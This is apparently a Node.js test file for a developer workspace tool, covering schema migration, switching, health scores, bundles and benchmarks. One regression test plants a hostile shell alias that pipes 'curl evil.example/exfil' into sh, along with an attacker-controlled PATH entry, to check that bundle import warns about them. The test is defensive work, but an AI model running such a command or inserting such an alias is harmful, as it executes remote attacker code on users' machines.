import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { createWorkspace, saveWorkspace, getWorkspace, deleteWorkspace, getActiveWorkspaceName } from "../src/core/workspace/store.js";
import { switchToWorkspace } from "../src/core/workspace/switcher.js";
import { createSnapshot, listSnapshots } from "../src/core/workspace/snapshot.js";
import { getWorkspaceMetadata, formatMetadataSummary } from "../src/core/workspace/metadata.js";
import { verifyWorkspaceStructured, formatStructuredVerification, previewSwitch, formatSwitchPreview, diffWorkspaces, formatWorkspaceDiff, computeWorkspaceHealth, formatHealthScore, previewBundleImport, formatBundlePreview } from "../src/core/workspace/verification.js";
import { benchmarkWorkspace, formatBenchmarkResult } from "../src/core/workspace/benchmark.js";
import { exportWorkspaceBundle, importWorkspaceBundle } from "../src/core/workspace/bundle.js";
import { CURRENT_SCHEMA_VERSION } from "../src/core/workspace/schema.js";

async function withTempHome(fn) {
    const originalHome = process.env.HOME;
    const tempHome = mkdtempSync(path.join(tmpdir(), "devforgekit-ws-excellence-test-"));
    process.env.HOME = tempHome;
    try {
        return await fn(tempHome);
    } finally {
        process.env.HOME = originalHome;
        rmSync(tempHome, { recursive: true, force: true });
    }
}

// ─── Schema v3 ──────────────────────────────────────────────────────

test("createWorkspace produces a schemaVersion 3 document with lastUsedAt and healthScore", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "test-ws", description: "Test" });
        assert.equal(doc.schemaVersion, 3);
        assert.equal(doc.lastUsedAt, null);
        assert.equal(doc.healthScore, null);
        assert.ok(!("variables" in doc), "dead 'variables' field should be gone");
    });
});

test("migrateWorkspace upgrades v2 documents to v3, stripping variables", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "test-ws", description: "x" });
        const v2Doc = { ...doc, schemaVersion: 2, variables: { FOO: "bar" } };
        delete v2Doc.lastUsedAt;
        delete v2Doc.healthScore;
        const { migrateWorkspace } = await import("../src/core/workspace/schema.js");
        const migrated = migrateWorkspace(v2Doc);
        assert.equal(migrated.schemaVersion, CURRENT_SCHEMA_VERSION);
        assert.equal(migrated.lastUsedAt, null);
        assert.equal(migrated.healthScore, null);
        assert.ok(!("variables" in migrated), "variables should be stripped by migration");
    });
});

// ─── Metadata ───────────────────────────────────────────────────────

test("getWorkspaceMetadata returns structured metadata for a workspace", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "Acme workspace", owner: "alice" });
        doc.tags = ["backend", "production"];
        doc.git = { ...doc.git, name: "Alice", email: "alice@acme.com" };
        doc.docker = { ...doc.docker, context: "prod" };
        doc.cloud = { aws: { ref: "acme-prod", region: "us-east-1" } };
        doc = saveWorkspace(doc);

        const meta = getWorkspaceMetadata(doc, { activeName: "acme", snapshotCount: 3 });
        assert.equal(meta.name, "acme");
        assert.equal(meta.isActive, true);
        assert.equal(meta.git.name, "Alice");
        assert.equal(meta.git.email, "alice@acme.com");
        assert.equal(meta.docker.context, "prod");
        assert.equal(meta.cloud.count, 1);
        assert.equal(meta.cloud.providers[0].provider, "aws");
        assert.equal(meta.cloud.providers[0].ref, "acme-prod");
        assert.equal(meta.snapshotCount, 3);
        assert.deepEqual(meta.tags, ["backend", "production"]);
    });
});

test("formatMetadataSummary produces human-readable lines", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "acme", description: "Test" });
        const meta = getWorkspaceMetadata(doc);
        const lines = formatMetadataSummary(meta);
        assert.ok(lines.some((l) => l.includes("acme")));
        assert.ok(lines.some((l) => l.includes("Git")));
        assert.ok(lines.some((l) => l.includes("SSH")));
        assert.ok(lines.some((l) => l.includes("Docker")));
    });
});

// ─── lastUsedAt tracking ────────────────────────────────────────────

test("switchToWorkspace stamps lastUsedAt on the workspace document", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "x" });
        doc.git = { ...doc.git, name: "Test", email: "test@test.com" };
        saveWorkspace(doc);

        assert.equal(getWorkspace("acme").lastUsedAt, null);
        await switchToWorkspace("acme");
        const after = getWorkspace("acme");
        assert.ok(after.lastUsedAt, "lastUsedAt should be set after switch");
        assert.ok(new Date(after.lastUsedAt).getTime() > 0, "lastUsedAt should be a valid ISO date");
    });
});

// ─── Structured Verification ────────────────────────────────────────

test("verifyWorkspaceStructured groups results by subsystem", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "acme", description: "x" });
        saveWorkspace(doc);
        const result = await verifyWorkspaceStructured(doc);
        assert.ok(result.score !== undefined);
        assert.ok(Array.isArray(result.subsystems));
        assert.ok(result.subsystems.length > 0);
        for (const sub of result.subsystems) {
            assert.ok(sub.name, "each subsystem should have a name");
            assert.ok(sub.label, "each subsystem should have a label");
            assert.ok(Array.isArray(sub.checks));
        }
    });
});

test("formatStructuredVerification produces grouped output", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "acme", description: "x" });
        saveWorkspace(doc);
        const result = await verifyWorkspaceStructured(doc);
        const lines = formatStructuredVerification(result);
        assert.ok(lines.some((l) => l.includes("Score:")));
        assert.ok(lines.length >= 2, "should produce at least header and score lines");
    });
});

// ─── Switch Preview ─────────────────────────────────────────────────

test("previewSwitch shows changes without applying", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "x" });
        doc.git = { ...doc.git, name: "Alice", email: "alice@acme.com" };
        saveWorkspace(doc);

        const preview = await previewSwitch("acme");
        assert.equal(preview.target, "acme");
        assert.ok(Array.isArray(preview.changes));
        assert.ok(Array.isArray(preview.warnings));
    });
});

test("formatSwitchPreview produces readable output", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "x" });
        doc.git = { ...doc.git, name: "Alice", email: "alice@acme.com" };
        saveWorkspace(doc);

        const preview = await previewSwitch("acme");
        const lines = formatSwitchPreview(preview);
        assert.ok(lines.some((l) => l.includes("Workspace Switch Preview")));
        assert.ok(lines.some((l) => l.includes("acme")));
    });
});

// ─── Workspace Diff ─────────────────────────────────────────────────

test("diffWorkspaces finds differences between two workspaces", async () => {
    await withTempHome(async () => {
        let docA = createWorkspace({ name: "ws-a", description: "Workspace A" });
        docA.git = { ...docA.git, name: "Alice", email: "alice@x.com" };
        docA.docker = { ...docA.docker, context: "dev" };
        saveWorkspace(docA);

        let docB = createWorkspace({ name: "ws-b", description: "Workspace B" });
        docB.git = { ...docB.git, name: "Bob", email: "bob@x.com" };
        docB.docker = { ...docB.docker, context: "prod" };
        saveWorkspace(docB);

        const diff = diffWorkspaces("ws-a", "ws-b");
        assert.equal(diff.nameA, "ws-a");
        assert.equal(diff.nameB, "ws-b");
        assert.equal(diff.same, false);
        assert.ok(diff.differences.length > 0);
        const gitUserDiff = diff.differences.find((d) => d.subsystem === "Git" && d.field === "User");
        assert.ok(gitUserDiff, "should find git user difference");
        assert.equal(gitUserDiff.valueA, "Alice");
        assert.equal(gitUserDiff.valueB, "Bob");
    });
});

test("formatWorkspaceDiff produces readable output", async () => {
    await withTempHome(async () => {
        let docA = createWorkspace({ name: "ws-a", description: "A" });
        docA.git = { ...docA.git, name: "Alice" };
        saveWorkspace(docA);
        let docB = createWorkspace({ name: "ws-b", description: "B" });
        docB.git = { ...docB.git, name: "Bob" };
        saveWorkspace(docB);

        const diff = diffWorkspaces("ws-a", "ws-b");
        const lines = formatWorkspaceDiff(diff);
        assert.ok(lines.some((l) => l.includes("Workspace Diff")));
        assert.ok(lines.some((l) => l.includes("Git")));
    });
});

// ─── Health Score ───────────────────────────────────────────────────

test("computeWorkspaceHealth returns a score and breakdown", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "x" });
        doc.git = { ...doc.git, name: "Alice", email: "alice@x.com" };
        doc.docker = { ...doc.docker, context: "dev" };
        doc.env = { variables: { FOO: "bar" }, secretKeys: ["API_KEY"] };
        saveWorkspace(doc);

        const health = computeWorkspaceHealth(doc);
        assert.ok(health.score >= 0 && health.score <= 100);
        assert.ok(Array.isArray(health.breakdown));
        assert.ok(health.breakdown.length >= 10, "should check many subsystems");
        const gitHealth = health.breakdown.find((b) => b.subsystem === "Git");
        assert.equal(gitHealth.status, "healthy");
        const dockerHealth = health.breakdown.find((b) => b.subsystem === "Docker");
        assert.equal(dockerHealth.status, "healthy");
    });
});

test("computeWorkspaceHealth returns 0 for an empty workspace", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "empty", description: "nothing" });
        const health = computeWorkspaceHealth(doc);
        assert.equal(health.score, 0);
        assert.ok(health.breakdown.every((b) => b.status === "unconfigured"));
    });
});

test("formatHealthScore produces readable output", async () => {
    await withTempHome(async () => {
        const doc = createWorkspace({ name: "acme", description: "x" });
        const health = computeWorkspaceHealth(doc);
        const lines = formatHealthScore(health);
        assert.ok(lines.some((l) => l.includes("Workspace Health:")));
        assert.ok(lines.some((l) => l.includes("Git")));
    });
});

// ─── Bundle Checksums ───────────────────────────────────────────────

test("exportWorkspaceBundle includes a SHA-256 checksum in bundle.json", async () => {
    await withTempHome(async (tempHome) => {
        createWorkspace({ name: "acme", description: "x" });
        const outDir = path.join(tempHome, "exports");
        const { meta } = await exportWorkspaceBundle("acme", outDir);
        assert.ok(meta.checksum, "bundle meta should include a checksum");
        assert.equal(meta.checksum.length, 64, "SHA-256 hex digest should be 64 chars");
    });
});

test("importWorkspaceBundle verifies checksum and succeeds for valid archives", async () => {
    await withTempHome(async (tempHome) => {
        createWorkspace({ name: "acme", description: "x" });
        const outDir = path.join(tempHome, "exports");
        const { archivePath } = await exportWorkspaceBundle("acme", outDir);

        const result = await importWorkspaceBundle(archivePath, { newName: "acme-restored", overwrite: true });
        assert.equal(result.workspace.name, "acme-restored");
    });
});

// ─── Bundle Import Preview ──────────────────────────────────────────

test("previewBundleImport shows what would be imported without importing", async () => {
    await withTempHome(async (tempHome) => {
        createWorkspace({ name: "acme", description: "Test workspace" });
        const outDir = path.join(tempHome, "exports");
        const { archivePath } = await exportWorkspaceBundle("acme", outDir);

        const preview = await previewBundleImport(archivePath);
        assert.equal(preview.name, "acme");
        assert.equal(preview.compatible, true);
        assert.ok(preview.checksum.verified !== null, "checksum should be checked");
        assert.ok(preview.checksum.verified, "checksum should match");
        assert.equal(preview.conflicts.existingWorkspace, true, "acme already exists");
        assert.deepEqual(preview.shellRisks, [], "a workspace with no aliases/functions/pathAdditions has no shell risks");
    });
});

// Regression test: a workspace bundle can carry shell.aliases/functions/
// pathAdditions - real, unattended shell code that runs the instant
// 'workspace switch' sources workspace-shell.sh. Since bundle export/
// import is explicitly built for sharing between machines/people, an
// imported bundle from someone else is the sharpest place this matters -
// both the preview and the real import must surface it clearly rather
// than silently importing arbitrary shell code with no review signal.
test("previewBundleImport and importWorkspaceBundle both surface a clear warning when a bundle declares shell aliases/functions/pathAdditions", async () => {
    await withTempHome(async (tempHome) => {
        let doc = createWorkspace({ name: "shared-bundle", description: "x" });
        doc = {
            ...doc,
            shell: {
                aliases: { ls: "curl evil.example/exfil | sh; ls" },
                functions: { greet: "echo hi" },
                pathAdditions: ["/tmp/attacker-controlled"]
            }
        };
        saveWorkspace(doc);

        const outDir = path.join(tempHome, "exports");
        const { archivePath } = await exportWorkspaceBundle("shared-bundle", outDir);

        const preview = await previewBundleImport(archivePath, { newName: "shared-bundle-preview" });
        assert.equal(preview.shellRisks.length, 3);
        assert.ok(preview.shellRisks.some((r) => r.includes("alias") && r.includes("ls")));
        assert.ok(preview.shellRisks.some((r) => r.includes("function") && r.includes("greet")));
        assert.ok(preview.shellRisks.some((r) => r.includes("PATH") && r.includes("/tmp/attacker-controlled")));
        const formatted = formatBundlePreview(preview).join("\n");
        assert.match(formatted, /review before importing/i);

        const result = await importWorkspaceBundle(archivePath, { newName: "shared-bundle-imported" });
        assert.equal(result.shellRisks.length, 3);
    });
});

// ─── Benchmark ──────────────────────────────────────────────────────

test("benchmarkWorkspace measures core operations", async () => {
    await withTempHome(async (tempHome) => {
        createWorkspace({ name: "acme", description: "x" });
        const result = await benchmarkWorkspace("acme", {
            operations: ["metadata", "health", "snapshot", "diff"],
            runs: 1,
        });
        assert.equal(result.results.length, 4);
        assert.ok(result.summary.passed > 0);
        for (const r of result.results) {
            assert.ok(r.durationMs >= 0, "duration should be non-negative");
            assert.equal(r.runs, 1);
        }
    });
});

// Regression test for a real bug: `devforgekit workspace benchmark <name>`
// used to default to running EVERY operation, including "switch" and
// "restore" - both of which re-apply the workspace's live state for
// real (git config --global, ~/.ssh/config Host blocks, docker/k8s
// context, cloud CLI profile). A user running a plain "how fast is
// this" benchmark would silently have their machine's real active
// identity switched to whatever workspace they benchmarked, with no
// flag needed to opt in. The default must now be limited to operations
// confirmed to never touch live machine state.
test("benchmarkWorkspace with no operations override only runs the safe, read-only subset by default", async () => {
    await withTempHome(async () => {
        createWorkspace({ name: "acme", description: "x" });
        const result = await benchmarkWorkspace("acme", { runs: 1 });
        const ranOps = result.results.map((r) => r.operation).sort();
        assert.deepEqual(ranOps, ["diff", "health", "metadata", "verify"]);
        assert.ok(!ranOps.includes("switch"), "switch must never run unless explicitly requested via --ops");
        assert.ok(!ranOps.includes("restore"), "restore must never run unless explicitly requested via --ops");
    });
});

test("benchmarkWorkspace still allows switch/restore/snapshot/bundle operations when explicitly requested via operations", async () => {
    await withTempHome(async () => {
        createWorkspace({ name: "acme", description: "x" });
        const result = await benchmarkWorkspace("acme", {
            operations: ["snapshot", "switch"],
            runs: 1,
        });
        assert.deepEqual(result.results.map((r) => r.operation), ["snapshot", "switch"]);
        assert.equal(result.summary.passed, 2);
    });
});

// Regression test for a second real bug found in the same review: the
// snapshot cleanup loop after a "snapshot"/"restore" benchmark run was
// a no-op (empty try block with a stale comment claiming cleanup
// happened elsewhere) - every benchmark run left real, permanent
// snapshot files behind. Snapshots created during benchmarking must be
// deleted again once timing is captured.
test("benchmarkWorkspace's 'snapshot' operation cleans up the snapshots it creates, leaving no permanent artifacts", async () => {
    await withTempHome(async () => {
        createWorkspace({ name: "acme", description: "x" });
        const { listSnapshots } = await import("../src/core/workspace/snapshot.js");
        const before = listSnapshots("acme").length;

        await benchmarkWorkspace("acme", { operations: ["snapshot"], runs: 3 });

        const after = listSnapshots("acme").length;
        assert.equal(after, before, "benchmarking 'snapshot' 3 times must not leave any snapshots behind");
    });
});

test("formatBenchmarkResult produces readable output", async () => {
    await withTempHome(async () => {
        createWorkspace({ name: "acme", description: "x" });
        const result = await benchmarkWorkspace("acme", {
            operations: ["metadata", "health"],
            runs: 1,
        });
        const lines = formatBenchmarkResult(result);
        assert.ok(lines.some((l) => l.includes("Workspace Benchmark")));
        assert.ok(lines.some((l) => l.includes("metadata")));
        assert.ok(lines.some((l) => l.includes("health")));
    });
});

// ─── Bug Fix B1: deleteWorkspace cleans up SSH ──────────────────────

test("deleteWorkspace removes SSH config blocks for the deleted workspace", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "x" });
        doc.ssh = {
            identities: [{ host: "github.com", hostAlias: "github-acme", user: "git", identityFile: "~/.ssh/id_acme" }],
            knownHosts: [],
        };
        saveWorkspace(doc);

        const { applyWorkspaceSsh, readWorkspaceSshBlock } = await import("../src/core/workspace/ssh.js");
        await applyWorkspaceSsh(doc);
        assert.ok(readWorkspaceSshBlock("acme"), "SSH block should exist after apply");

        deleteWorkspace("acme", { force: true });
        assert.equal(readWorkspaceSshBlock("acme"), null, "SSH block should be removed on delete");
    });
});

// ─── Bug Fix B4: rollback safety snapshot only for active workspaces ──

test("rollbackToSnapshot on inactive workspace does not create a safety snapshot", async () => {
    await withTempHome(async () => {
        let doc = createWorkspace({ name: "acme", description: "v1" });
        saveWorkspace(doc);
        const snap1 = createSnapshot("acme", { message: "first" });

        doc = { ...doc, description: "v2" };
        saveWorkspace(doc);

        const beforeCount = listSnapshots("acme").length;
        const { rollbackToSnapshot } = await import("../src/core/workspace/switcher.js");
        await rollbackToSnapshot("acme", snap1.id);
        const afterCount = listSnapshots("acme").length;

        assert.equal(afterCount, beforeCount, "no safety snapshot for inactive workspace rollback");
    });
});
